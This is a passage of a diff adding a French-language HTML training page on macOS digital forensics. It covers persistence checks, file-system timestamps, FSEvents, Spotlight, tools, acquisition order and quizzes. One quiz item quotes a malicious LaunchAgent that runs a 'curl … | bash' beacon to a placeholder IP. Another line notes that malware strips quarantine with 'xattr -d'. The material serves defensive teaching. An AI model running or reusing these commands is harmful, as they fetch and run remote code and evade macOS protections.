+    <div class="meta-num">Legacy</div>
+    <div class="meta-name">at / periodic</div>
+    <div class="meta-desc">Tâches différées Unix héritées</div>
+  </div>
+
+</div>
+<div class="meta-detail" id="persist-detail"></div>
+
+<!-- Checklist forensique -->
+<div class="sec-title">Checklist de vérification — Persistance macOS</div>
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:.9rem 1rem;margin:.75rem 0">
+
+  <div style="margin-bottom:.75rem">
+    <div style="font-size:.65rem;color:var(--cyan);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">1. LaunchAgents &amp; LaunchDaemons</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      ls -la ~/Library/LaunchAgents/<br>
+      ls -la /Library/LaunchAgents/<br>
+      ls -la /Library/LaunchDaemons/<br>
+      ls -la /System/Library/LaunchDaemons/ <span style="color:var(--dim)"># Apple natifs — vérifier les modifiés</span>
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--gold);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">2. Analyser un plist suspect</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      plutil -convert xml1 suspicious.plist -o -  <span style="color:var(--dim)"># Convertit binaire → XML lisible</span><br>
+      defaults read ~/Library/LaunchAgents/com.evil.backdoor.plist<br>
+      <span style="color:var(--dim)"># Champs clés : ProgramArguments, RunAtLoad, StartInterval, KeepAlive</span>
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--purple);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">3. Login Items (macOS 13+ : Background Items)</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      sfltool dumpbtm  <span style="color:var(--dim)"># Background Task Manager (macOS 13+)</span><br>
+      <span style="color:var(--dim)"># GUI : Réglages système → Général → Éléments d'ouverture de session</span><br>
+      defaults read ~/Library/Preferences/com.apple.loginitems.plist
+    </code>
+  </div>
+
+  <div style="margin-bottom:.75rem;padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--green);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">4. Profils de configuration MDM</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      profiles list -all  <span style="color:var(--dim)"># Liste tous les profils installés</span><br>
+      profiles show -all  <span style="color:var(--dim)"># Contenu détaillé</span><br>
+      ls /Library/Managed\ Preferences/
+    </code>
+  </div>
+
+  <div style="padding-top:.75rem;border-top:1px solid var(--border)">
+    <div style="font-size:.65rem;color:var(--red);font-weight:700;letter-spacing:.08em;text-transform:uppercase;margin-bottom:.35rem">5. Unified Log — Activité launchd</div>
+    <code style="font-size:.67rem;color:var(--text);line-height:1.9;display:block">
+      log show --predicate 'subsystem == "com.apple.launchd"' --last 7d<br>
+      log show --predicate 'process == "launchd" AND eventMessage CONTAINS "load"' --last 7d
+    </code>
+  </div>
+
+</div>
+
+<div class="alert">
+  🎯 <strong>Red flag absolu</strong> : un LaunchAgent/Daemon avec <code>RunAtLoad = true</code> + <code>ProgramArguments</code> pointant vers <code>/tmp/</code>, <code>/var/folders/</code>, ou un script en base64 encodé dans <code>ProgramArguments</code>. Vérifier aussi <code>EnvironmentVariables</code> — un C2 peut passer ses paramètres via des variables d'environnement.
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Un plist trouvé dans <code>~/Library/LaunchAgents/com.apple.update.helper.plist</code> contient <code>RunAtLoad = true</code> et <code>ProgramArguments = ["/bin/bash", "-c", "curl -s http://185.x.x.x/beacon | bash"]</code>. Quels artefacts permettent de dater son installation ?<small>Persistance · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
+    <strong>1. Timestamps du fichier plist</strong> : <code>GetFileInfo ~/Library/LaunchAgents/com.apple.update.helper.plist</code> → date de création et modification.<br>
+    <strong>2. FSEvents</strong> : <code>/.fseventsd/</code> enregistre la création du fichier dans <code>~/Library/LaunchAgents/</code> avec timestamp précis.<br>
+    <strong>3. Unified Log</strong> : <code>log show --predicate 'subsystem == "com.apple.launchd" AND eventMessage CONTAINS "com.apple.update.helper"'</code> → premier chargement par launchd.<br>
+    <strong>4. QuarantineDB</strong> : si le dropper a été téléchargé, l'URL source est dans <code>QuarantineEventsV2</code>.<br>
+    <strong>5. Spotlight</strong> : peut avoir indexé le fichier plist et retenir des métadonnées même après suppression.<br>
+    <strong>Note</strong> : le nom <code>com.apple.update.helper</code> est délibérément trompeur — comparer avec les plists Apple légitimes dans <code>/System/Library/</code>.
+  </div>
+</div>
+</div><!-- /tab-persistance -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 4 — FS & TIMESTAMPS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-fs">
+
+<div class="concept-card">
+  <div class="concept-title">💾 Systèmes de fichiers macOS — HFS+ et APFS</div>
+  macOS a utilisé <strong>HFS+</strong> (Mac OS Extended) de 1998 jusqu'en 2017, puis Apple a introduit <strong>APFS</strong> (Apple File System) sur les SSD et puces Apple Silicon. Les deux coexistent encore : un Mac moderne avec Time Machine externe peut avoir un volume APFS interne et un volume HFS+ externe. <strong>Les timestamps sont radicalement différents entre les deux</strong> — erreur fréquente en forensique.
+</div>
+
+<div class="sec-title">Timestamps macOS — Comparatif HFS+ vs APFS</div>
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div class="card card-gold">
+    <div class="ct">📼 HFS+ — Mac OS Extended</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Epoch :</strong> 1er janvier <strong>1904</strong> 00:00:00 UTC<br>
+      <strong>Résolution :</strong> 1 seconde<br>
+      <strong>Stockage :</strong> 4 octets (uint32)<br>
+      <strong>Conversion :</strong> <code>unix = hfs - 2082844800</code><br>
+      <strong>Timestamps :</strong> Created · Modified · Accessed · Backup<br>
+      <strong>Limite :</strong> pas de ntime · granularité faible · problèmes DST
+    </div>
+  </div>
+  <div class="card card-cyan">
+    <div class="ct">⚡ APFS — Apple File System (2017+)</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.7;margin-top:.3rem">
+      <strong>Epoch :</strong> 1er janvier <strong>2001</strong> 00:00:00 UTC<br>
+      <strong>Résolution :</strong> 1 nanoseconde (le plus précis)<br>
+      <strong>Stockage :</strong> 8 octets (int64, nanosecondes)<br>
+      <strong>Conversion :</strong> <code>unix = apfs/1e9 + 978307200</code><br>
+      <strong>Timestamps :</strong> Created · Modified · Changed · Accessed<br>
+      <strong>Atout :</strong> snapshots natifs · clones instantanés · chiffrement
+    </div>
+  </div>
+</div>
+
+<!-- FSEvents -->
+<div class="sec-title">FSEvents — Le journal du système de fichiers macOS</div>
+<div class="alert">
+  🎯 <strong>FSEvents</strong> est l'équivalent macOS du <code>$UsnJrnl</code> NTFS. C'est un journal des <strong>modifications du système de fichiers</strong> — créations, suppressions, renommages, modifications d'attributs. Il est stocké dans <code>/.fseventsd/</code> sous forme de fichiers binaires numérotés séquentiellement. FSEvents <strong>survit aux redémarrages</strong> et peut révéler des fichiers supprimés longtemps après.
+</div>
+
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div style="padding:.8rem .9rem;border-radius:10px;border:1px solid rgba(0,229,204,.3);background:rgba(0,229,204,.05)">
+    <div style="font-size:.65rem;color:var(--cyan);font-weight:700;margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.07em">Structure des fichiers FSEvents</div>
+    <div style="font-size:.74rem;color:var(--muted);line-height:1.7">
+      <code>/.fseventsd/</code><br>
+      · Fichiers nommés par numéro hexadécimal (ex: <code>000000000123ab4f</code>)<br>
+      · Format : gzip compressé, enregistrements binaires<br>
+      · Chaque enregistrement : chemin complet + flags d'événement<br>
+      · Pas de timestamp par événement — utiliser les timestamps des fichiers FSEvents eux-mêmes comme borne temporelle
+    </div>
+  </div>
+  <div style="padding:.8rem .9rem;border-radius:10px;border:1px solid rgba(240,192,64,.3);background:rgba(240,192,64,.05)">
+    <div style="font-size:.65rem;color:var(--gold);font-weight:700;margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.07em">Flags forensiques importants</div>
+    <div style="font-size:.74rem;color:var(--muted);line-height:1.7">
+      <code>Created</code> — fichier créé<br>
+      <code>Removed</code> — fichier <strong>supprimé</strong> (gold mine forensique)<br>
+      <code>Renamed</code> — renommé (révèle extension camouflée)<br>
+      <code>Modified</code> — contenu modifié<br>
+      <code>InodeMetaMod</code> — métadonnées modifiées<br>
+      <code>XattrMod</code> — attribut étendu modifié (quarantine, etc.)
+    </div>
+  </div>
+</div>
+
+<div style="background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:.8rem 1rem;margin:.75rem 0;font-family:var(--mono);font-size:.68rem;line-height:1.9;color:var(--text)">
+  <span style="color:var(--cyan)"># Parser FSEvents avec mac_apt (hors-ligne depuis image disque)</span><br>
+  mac_apt.py -i image.dmg -o /output FSEVENTS<br><br>
+  <span style="color:var(--cyan)"># fsevents_dump (outil dédié)</span><br>
+  python3 fsevents_dump.py /.fseventsd/ | grep "Removed" | grep ".docx"<br><br>
+  <span style="color:var(--cyan)"># Sur système live : Endpoint Security Framework (root requis)</span><br>
+  <span style="color:var(--dim)"># Il n'existe pas de commande native pour lire /.fseventsd/ directement</span>
+</div>
+
+<!-- Spotlight -->
+<div class="sec-title">Spotlight — Index des métadonnées</div>
+<div style="overflow-x:auto">
+<table>
+  <thead><tr><th>Aspect</th><th>Détail forensique</th></tr></thead>
+  <tbody>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Emplacement</td>
+      <td style="font-size:.75rem"><code>~/.Spotlight-V100/Store-V2/</code> (home) · <code>/Volumes/X/.Spotlight-V100/</code> (volumes externes)</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Persistance</td>
+      <td style="font-size:.75rem">Les métadonnées de fichiers <strong>supprimés</strong> restent dans l'index jusqu'à la prochaine réindexation complète. Source cruciale pour prouver l'existence passée d'un fichier.</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Contenu</td>
+      <td style="font-size:.75rem">Chemin, type, créateur, dates, auteur, mots-clés, coordonnées GPS (photos), durée (vidéos), contacts associés.</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">CLI natif</td>
+      <td style="font-size:.75rem"><code>mdfind -name "rapport_confidentiel"</code> · <code>mdls fichier.pdf</code> (métadonnées d'un fichier)</td>
+    </tr>
+    <tr>
+      <td style="font-weight:600;font-size:.78rem">Outil forensique</td>
+      <td style="font-size:.75rem"><code>mac_apt SPOTLIGHT</code> · <code>spotlight_parser</code> — extraient l'index complet hors-ligne</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<!-- Time Machine -->
+<div class="sec-title">Time Machine — Source de preuves historiques</div>
+<div style="display:grid!important;grid-template-columns:1fr 1fr;gap:.65rem;margin:.75rem 0">
+  <div class="card card-green">
+    <div class="ct">📦 Time Machine HFS+ (classique)</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.6;margin-top:.3rem">
+      Structure de dossiers datés dans <code>/Volumes/Backup/Backups.backupdb/[hostname]/[date]/</code>. Chaque sauvegarde = snapshot avec hard links vers les fichiers inchangés. Un fichier supprimé peut être retrouvé dans les sauvegardes précédentes. Monter le volume et naviguer directement.
+    </div>
+  </div>
+  <div class="card card-cyan">
+    <div class="ct">⚡ Time Machine APFS (snapshots)</div>
+    <div style="font-size:.76rem;color:var(--muted);line-height:1.6;margin-top:.3rem">
+      Utilise les <strong>snapshots APFS natifs</strong> sur le volume local (avant APFS externe). Commandes : <code>tmutil listlocalsnapshots /</code> · <code>tmutil mount -snapshot com.apple.TimeMachine.2024-03-15-XXXXXX /mnt/snap</code>. Snapshots locaux ≈ 24h de rétention selon l'espace disque.
+    </div>
+  </div>
+</div>
+
+<div class="memo-grid">
+  <div class="memo-card">
+    <h4>⚠️ Pièges timestamps macOS</h4>
+    <ul class="memo-list">
+      <li><strong>HFS+ Epoch 1904 ≠ APFS Epoch 2001 ≠ Unix Epoch 1970</strong></li>
+      <li>Les plist CoreData utilisent l'Epoch 2001 : <code>+978307200</code> pour Unix</li>
+      <li>macOS peut afficher les timestamps en heure locale — toujours vérifier le fuseau</li>
+      <li>Timezone dans : <code>/etc/localtime</code> et <code>/Library/Preferences/.GlobalPreferences.plist</code></li>
+      <li>EXIF GPS vs macOS timezone = vecteur de détection de falsification</li>
+    </ul>
+  </div>
+  <div class="memo-card">
+    <h4>🔑 Attributs étendus — xattr</h4>
+    <ul class="memo-list">
+      <li><code>com.apple.quarantine</code> — URL source + date + app ayant téléchargé</li>
+      <li><code>com.apple.metadata:kMDItemWhereFroms</code> — URL origine Spotlight</li>
+      <li><code>xattr -l fichier.dmg</code> — lister tous les attributs étendus</li>
+      <li><code>xattr -p com.apple.quarantine fichier.app</code> — lire la quarantine</li>
+      <li>Un malware qui supprime son xattr quarantine : <code>xattr -d com.apple.quarantine</code></li>
+    </ul>
+  </div>
+</div>
+</div><!-- /tab-fs -->
+
+<!-- ══════════════════════════════════════════════
+     TAB 5 — OUTILS
+══════════════════════════════════════════════ -->
+<div class="tab-page" id="tab-outils">
+
+<div class="sec-title">Outils forensiques macOS</div>
+
+<div class="tool-grid">
+
+  <div class="tool-card" style="border-left:3px solid var(--cyan)">
+    <div class="tool-name">mac_apt</div>
+    <div class="tool-by">Yogesh Khatri (mac4n6)</div>
+    <div class="tool-desc">L'outil de référence pour l'extraction automatisée des artefacts macOS depuis une image disque ou un système live. Couvre : Unified Log, knowledgeC.db, QuarantineDB, FSEvents, Spotlight, LaunchAgents, Safari, Mail, et 50+ autres plugins.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--gold)">
+    <div class="tool-name">APOLLO</div>
+    <div class="tool-by">Sarah Edwards (mac4n6)</div>
+    <div class="tool-desc">Apple Pattern of Life Lazy Output'er — parsing automatisé de knowledgeC.db et des bases CoreData Apple. Génère une timeline HTML interactive. Référence pour l'analyse comportementale macOS.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--purple)">
+    <div class="tool-name">iLEAPP</div>
+    <div class="tool-by">Alexis Brignoni</div>
+    <div class="tool-desc">iOS / macOS Logs, Events And Properties Parser. Extraction d'artefacts iOS et macOS, notamment pour les sauvegardes iTunes/Finder et les appareils en extraction logique.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI / GUI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--blue)">
+    <div class="tool-name">UnifiedLogReader</div>
+    <div class="tool-by">Yogesh Khatri</div>
+    <div class="tool-desc">Parser autonome pour les fichiers .tracev3 de l'Unified Log. Fonctionne sur Windows et Linux depuis une copie des dossiers diagnostics/ + uuidtext/. Sortie texte ou SQLite.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI Python</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--green)">
+    <div class="tool-name">Autopsy + TSK</div>
+    <div class="tool-by">Basis Technology / Brian Carrier</div>
+    <div class="tool-desc">Analyse d'images disque HFS+ et APFS. Récupération de fichiers supprimés, timeline, recherche de hash. Interface graphique. Plugins communautaires pour les artefacts Apple.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-gui">GUI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--red)">
+    <div class="tool-name">Magnet AXIOM / Cellebrite UFED</div>
+    <div class="tool-by">Magnet Forensics / Cellebrite</div>
+    <div class="tool-desc">Solutions commerciales complètes : extraction + parsing automatisé + corrélation. Supportent Mac, iPhone, iCloud. Standards dans les enquêtes judiciaires et chez les forces de l'ordre helvétiques.</div>
+    <div><span class="tool-tag tt-com">Commercial</span><span class="tool-tag tt-gui">GUI</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--cyan)">
+    <div class="tool-name">plutil / defaults</div>
+    <div class="tool-by">Apple (natif macOS)</div>
+    <div class="tool-desc">Conversion et lecture des Property Lists binaires. <code>plutil -convert xml1 file.plist</code> rend lisible tout plist binaire. <code>defaults read</code> pour les préférences. Aucune installation requise.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI natif</span></div>
+  </div>
+
+  <div class="tool-card" style="border-left:3px solid var(--gold)">
+    <div class="tool-name">osquery</div>
+    <div class="tool-by">Meta / CIS</div>
+    <div class="tool-desc">Interrogation du système macOS via SQL. Tables : processes, launchd, users, browser_plugins, certificates, etc. Idéal pour le triage live et le threat hunting sur Mac.</div>
+    <div><span class="tool-tag tt-free">Gratuit</span><span class="tool-tag tt-cmd">CLI SQL</span></div>
+  </div>
+
+</div>
+
+<!-- Tableau acquisitions -->
+<div class="sec-title">Ordre d'acquisition macOS — Spécificités T2 / Apple Silicon</div>
+<div class="alert">
+  ⚠️ <strong>Puce T2 (Intel) et Apple Silicon (M-series)</strong> : depuis 2018 (T2) et 2020 (M1+), les Mac intègrent une puce de sécurité qui active le <strong>Secure Boot</strong> et le chiffrement SSD matériel par défaut. <strong>L'acquisition forensique classique via USB est bloquée</strong> sans désactiver le Secure Boot en mode de récupération. Un Mac chiffré FileVault 2 sans clé de récupération est inacquérable en post-mortem.
+</div>
+
+<div style="border:1px solid var(--border);border-radius:10px;overflow:hidden;margin:.75rem 0">
+  <div style="background:var(--surface2);padding:.45rem .85rem;font-family:var(--mono);font-size:.6rem;font-weight:700;letter-spacing:.09em;text-transform:uppercase;color:var(--dim);border-bottom:1px solid var(--border);display:grid!important;grid-template-columns:60px 180px 1fr 120px">
+    <span>ORDRE</span><span>SOURCE</span><span>PROCÉDURE</span><span>CONTRAINTE</span>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 120px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--red);border-right:1px solid var(--border);background:rgba(255,64,96,.05)">1 🔴</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">RAM live</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">osXpmem ou Recon Imager. Nécessite SIP désactivé ou rootless mode.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--red)">SIP / T2 bloquant</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 120px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--gold);border-right:1px solid var(--border);background:rgba(240,192,64,.05)">2 🟡</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Unified Log live</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)"><code>log collect --last 7d --output /Volumes/USB/sys.logarchive</code></div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--gold)">Rétention ≈ 7j</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 120px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--gold);border-right:1px solid var(--border);background:rgba(240,192,64,.05)">3 🟡</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Triage live</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">mac_apt live mode ou script de collecte : knowledgeC, QuarantineDB, LaunchAgents, history vers USB.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--gold)">Modifie atime</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 120px;border-bottom:1px solid var(--border)">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--green);border-right:1px solid var(--border);background:rgba(48,232,138,.05)">4 🟢</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">Image disque</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Mode cible (T-mode) via Thunderbolt, ou boot USB Recovery + désactiver Secure Boot. <code>dd</code> ou <code>dc3dd</code> si déchiffré.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--red)">FileVault / T2</div>
+  </div>
+
+  <div style="display:grid!important;grid-template-columns:60px 180px 1fr 120px">
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;font-weight:700;color:var(--blue);border-right:1px solid var(--border);background:rgba(88,166,255,.05)">5 🔵</div>
+    <div style="padding:.5rem .85rem;font-family:var(--mono);font-size:.7rem;border-right:1px solid var(--border);font-weight:600">iCloud / MDM</div>
+    <div style="padding:.5rem .85rem;font-size:.74rem;border-right:1px solid var(--border);color:var(--muted)">Sauvegarde iCloud via réquisition Apple (MLAT si hors CH). MDM logs si machine gérée par l'organisation.</div>
+    <div style="padding:.5rem .85rem;font-size:.68rem;color:var(--blue)">Légal requis</div>
+  </div>
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — macOS Forensique</div>
+  <p><strong>knowledgeC.db</strong> = boîte noire utilisateur · SQLite · Epoch 2001 · APOLLO pour le parser</p>
+  <p><strong>QuarantineEventsV2</strong> = URL source de chaque téléchargement · persiste après suppression du fichier</p>
+  <p><strong>FSEvents ≈ $UsnJrnl</strong> : journal des modifications FS · révèle fichiers supprimés · <code>/.fseventsd/</code></p>
+  <p><strong>LaunchAgents</strong> (utilisateur, sans root) vs <strong>LaunchDaemons</strong> (système, root, avant login)</p>
+  <p><strong>T2 / M-series</strong> : Secure Boot bloque l'acquisition directe — préférer le triage live ou le mode cible Thunderbolt</p>
+  <p><strong>Unified Log</strong> : copier <code>/var/db/diagnostics/</code> <em>et</em> <code>/var/db/uuidtext/</code> — les deux sont indissociables</p>
+</div>
+
+<div class="quiz-wrap">
+  <div class="quiz-q">Un technicien DFIR récupère un MacBook Pro M2 d'un employé suspecté d'espionnage industriel. Le Mac est chiffré avec FileVault 2 et la puce M2 active le Secure Boot. Quelle est la stratégie d'acquisition optimale ?<small>Acquisition macOS · Niveau : difficile</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">
+    <strong>Situation</strong> : Apple Silicon (M2) + FileVault 2 = acquisition bit-à-bit classique impossible sans clé de déchiffrement.<br><br>
+    <strong>Option 1 — Mac encore allumé et déverrouillé (idéal)</strong> :<br>
+    · Brancher une clé USB et lancer un script de triage live : copier knowledgeC.db, QuarantineDB, LaunchAgents, Safari, Mail, Unified Log (<code>log collect</code>), bash/zsh history.<br>
+    · Exporter le Unified Log : <code>log collect --last 7d --output /Volumes/USB/sys.logarchive</code><br><br>
+    <strong>Option 2 — Mac éteint, clé FileVault connue</strong> :<br>
+    · Boot en mode récupération (maintenir bouton power) → désactiver Secure Boot dans Options de démarrage.<br>
+    · Connecter en mode cible Thunderbolt → acquérir avec dc3dd depuis un Mac analyste.<br>
+    · Si clé institutionnelle MDM disponible : utiliser la clé de récupération FileVault.<br><br>
+    <strong>Option 3 — Mac éteint, clé FileVault inconnue</strong> :<br>
+    · Réquisition légale auprès d'Apple (MLAT si nécessaire) pour la clé de récupération iCloud.<br>
+    · Si machine MDM : demander la clé de dépôt à l'administrateur IT.<br>
+    · En dernier recours : image chiffrée + attaque par dictionnaire (peu probable sur FileVault 2 bien configuré).<br><br>
+    <strong>Dans tous les cas</strong> : documenter chaque action, photographier, chaîne de custody.
+  </div>
+</div>
+</div><!-- /tab-outils -->
+
+<script>
+// ── Tab switching ──
+function showTab(id, btn) {
+  document.querySelectorAll('.tab-page').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.tab').forEach(function(b){b.classList.remove('active');});
+  var el = document.getElementById('tab-'+id);
+  if(el) el.classList.add('active');
+  if(btn) btn.classList.add('active');
+}
+
+// ── Quiz reveal ──
+document.addEventListener('click', function(e) {
+  if(e.target && e.target.classList.contains('quiz-reveal-btn')) {
+    var wrap = e.target.closest('.quiz-wrap');
+    if(!wrap) return;
+    var ans = wrap.querySelector('.quiz-answer');
+    if(ans) ans.style.display = ans.style.display === 'block' ? 'none' : 'block';
+  }
+});
+
+// ── Zone artefacts ──
+var artZones = {
+  user: {
+    icon: '👤',
+    title: '~/Library/ — Artefacts utilisateur Apple',
+    body: `<strong>knowledgeC.db</strong> : <code>~/Library/Application Support/Knowledge/knowledgeC.db</code> — timeline complète d'activité utilisateur. Applications, recherches, localisation, notifications. Format SQLite, Epoch 2001. Outil : APOLLO.<br><br>
+    <strong>QuarantineEventsV2</strong> : <code>~/Library/Application Support/com.apple.LaunchServices/</code> — URL source exacte de chaque téléchargement. Persiste après suppression du fichier.<br><br>
+    <strong>Safari</strong> : <code>~/Library/Safari/History.db</code> (historique), <code>Downloads.plist</code> (téléchargements), <code>BrowserState.db</code> (onglets).<br><br>
+    <strong>Recent Items</strong> : <code>~/Library/Preferences/com.apple.recentitems.plist</code> — fichiers, apps, serveurs récents. Persiste après effacement via menu Apple.<br><br>
+    <strong>Corbeille</strong> : <code>~/.Trash/</code> — fichiers supprimés via Finder avec timestamps d'origine préservés. Volumes externes : <code>/Volumes/X/.Trashes/[UID]/</code>.`
+  },
+  logs: {
+    icon: '📋',
+    title: 'Unified Log — /var/db/diagnostics/',
+    body: `<strong>Format</strong> : binaire .tracev3 — non lisible directement. Outils nécessaires : commande <code>log</code> native (macOS uniquement), <code>mac_apt</code> ou <code>UnifiedLogReader</code> (cross-platform).<br><br>
+    <strong>/var/db/diagnostics/</strong> : données des événements. Sous-dossiers : <code>Persist/</code> (≈7 jours), <code>HighVolume/</code> (rotation rapide), <code>Special/</code> (boot), <code>Signpost/</code> (performance).<br><br>
+    <strong>/var/db/uuidtext/</strong> : format strings — <strong>indispensable</strong> pour décoder les logs. À copier en même temps que diagnostics/.<br><br>
+    <strong>Acquérir sur système live</strong> : <code>log collect --last 7d --output archive.logarchive</code><br><br>
+    <strong>Subsystems clés</strong> : <code>com.apple.securityd</code> (auth), <code>com.apple.launchd</code> (persistance), <code>com.apple.network</code> (connexions), <code>com.apple.Bluetooth</code> (périphériques).`
+  },
+  fs: {
+    icon: '📁',
+    title: 'FSEvents & Spotlight — Journal et index FS',
+    body: `<strong>FSEvents</strong> : <code>/.fseventsd/</code> — journal binaire des modifications du système de fichiers. Créations, suppressions, renommages. Survit aux redémarrages. Pas de timestamp par événement individuel — utiliser les timestamps des fichiers FSEvents comme bornes.<br><br>
+    <strong>Valeur forensique FSEvents</strong> : révèle les fichiers supprimés longtemps après leur effacement. Comparable au $UsnJrnl NTFS. Parser : <code>mac_apt FSEVENTS</code> ou <code>fsevents_dump.py</code>.<br><br>
+    <strong>Spotlight Store-V2</strong> : <code>~/.Spotlight-V100/Store-V2/</code> — index de recherche contenant les métadonnées de <em>tous</em> les fichiers indexés, y compris supprimés. Parser : <code>mac_apt SPOTLIGHT</code> ou <code>spotlight_parser</code>.<br><br>
+    <strong>Attributs étendus (xattr)</strong> : <code>com.apple.quarantine</code> = URL source + date. <code>xattr -l fichier</code> pour lister.`
+  },
+  persist: {
+    icon: '🔄',
+    title: 'Persistance — LaunchAgents, LaunchDaemons, Login Items',
+    body: `<strong>LaunchAgents utilisateur</strong> : <code>~/Library/LaunchAgents/</code> — s'exécutent au login de l'utilisateur. Pas besoin de root. Cible privilégiée des malwares macOS.<br><br>
+    <strong>LaunchAgents système</strong> : <code>/Library/LaunchAgents/</code> — s'exécutent pour tous les utilisateurs au login. Nécessite root pour y écrire.<br><br>
+    <strong>LaunchDaemons</strong> : <code>/Library/LaunchDaemons/</code> — s'exécutent au démarrage avant toute session. Root. Sans interface graphique. Accès réseau immédiat. Cible des backdoors serveur.<br><br>
+    <strong>Login Items (macOS 13+)</strong> : géré par <code>sfltool</code> et le Background Task Manager. Plus visible dans Réglages Système → Général → Éléments d'ouverture de session.<br><br>
+    <strong>Profils MDM</strong> : <code>profiles list -all</code> — un profil malveillant peut configurer un proxy, désactiver des protections, ou installer un certificat racine.`
+  },
+  tm: {
+    icon: '⏳',
+    title: 'Time Machine — Archives historiques',
+    body: `<strong>Time Machine HFS+</strong> : <code>/Volumes/Backup/Backups.backupdb/[hostname]/[YYYY-MM-DD-HHMMSS]/</code>. Structure de dossiers avec hard links pour les fichiers inchangés. Navigable directement dans le Finder ou le terminal.<br><br>
+    <strong>Time Machine APFS</strong> : snapshots APFS locaux. Commandes : <code>tmutil listlocalsnapshots /</code> pour lister · <code>tmutil localsnapshot</code> pour créer manuellement.<br><br>
+    <strong>Valeur forensique</strong> : retrouver des fichiers supprimés qui existaient lors d'une sauvegarde antérieure. Reconstituer l'état du système à un moment précis. Révéler des modifications apportées entre deux sauvegardes.<br><br>
